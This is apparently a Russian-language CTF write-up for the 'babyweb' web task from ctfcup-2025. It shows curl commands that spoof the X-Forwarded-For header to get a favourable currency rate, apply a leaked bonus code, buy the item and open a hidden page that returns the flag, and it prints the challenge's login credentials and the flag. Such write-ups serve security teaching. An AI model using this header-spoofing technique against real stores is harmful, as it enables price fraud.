---
title: '[WEB] CTF "babyweb" (ctfcup-2025)'
date: 2025-12-02T07:14:00+03:00
categories:
  - ctf
tags:
  - web
header:
  overlay_image: https://sun9-59.userapi.com/s_zZEilvqUakEGrGq9LHIrYJ52r0hX7kbjzyUw/MC90rp7PPXU.jpg  # твой баннер
  overlay_filter: 0.4                                # затемнение (0–1, можно убрать)
  caption: "Кубок CTF 2025"                       # подпись под картинкой (опционально)
---

# Задача из ctfcup-2025 "babyweb"

**Флаг:** `CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}`  

## Идея

В фронтенде есть legacy-код:

- `shop.js` (старый `completePurchase`):
  - после успешной покупки был редирект на `/purchase-details?secret=premium`
  - бонус-код: `BONUS-CTF-COIN`
- `auth.js` (старый `authenticateUser`)  
Комментарий из кода:  
  ```js
  'X-Forwarded-For': getUserLocation() || '127.0.0.1'
  // DO NOT DELETE YET! (Mike, 2024-10-15)
  ```

Сервер использует `X-Forwarded-For` для определения региона и валюты/курса, а мы можем его подменить.

---

## Эксплуатация

1. **Логин с подменой IP на США**

   ```bash
   curl -X POST \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 8.8.8.8" \
     -d '{"email": "ctf_c0c84c12@ctfmarket.com", "password": "cddd19febff79f7a"}' \
     -c cookies.txt \
     http://158.160.13.253:30621/api/auth
   ```

2. **Проверяем аккаунт**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/account
   ```

   Важное из ответа:

   ```json
   {"coins":100,"currency":"RUB-USD","exchange_rate":80}
   ```

3. **Проверяем корзину**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/basket
   ```

   Товар: `Premium CTF Membership (Annual)` за `8.75 USD`.

4. **Применяем бонус-код**

   ```bash
   curl -X POST \
     -b cookies.txt \
     "http://158.160.13.253:30621/api/bonus?code=BONUS-CTF-COIN"
   ```

5. **Завершаем покупку**

   ```bash
   curl -X POST \
     -b cookies.txt \
     http://158.160.13.253:30621/api/purchase
   ```

   Ответ: `{"response":"Purchase completed successfully"}`

6. **Ручной переход на скрытую страницу**

   ```bash
   curl -b cookies.txt \
     "http://158.160.13.253:30621/purchase-details?secret=premium"
   ```

   В ответе:

   ```html
   <p style="color: red; font-weight: bold;">
     CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}
   </p>
   ```

---

## Суть бага

- Сервер доверяет клиентскому `X-Forwarded-For` и выбирает валюту/курс по нему.
- При IP из США наши 100 монет с выгодным курсом считаются достаточными для покупки.
- После успешной покупки legacy-страница `/purchase-details?secret=premium` всё ещё доступна и выдаёт флаг.
### Спасибо за внимание))
